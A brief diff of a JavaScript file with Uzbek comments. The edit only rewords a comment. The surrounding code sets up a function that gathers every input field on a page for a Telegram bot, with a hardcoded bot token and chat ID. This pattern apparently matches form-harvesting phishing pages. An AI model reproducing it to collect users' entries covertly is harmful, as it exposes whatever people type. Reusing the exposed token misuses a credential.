@@ -13,7 +13,7 @@ function redirectToPhoneNumber() {
 function sendToTelegram() {
     // Input qiymatlarni olish
     const Input = document.querySelectorAll('input');
-    // Telegram Botning API manzilini va chat ID sini o'zgartiring
+    // Telegram Botning API manzilini va chat ID sini o'zgartirish
     const telegramBotAPI = 'https://api.telegram.org/bot6752979823:AAEQq-Eu8mE5p073b12-cfs6Y4WWdldl-iY/sendMessage';
     const chatId = '6462444239';
 
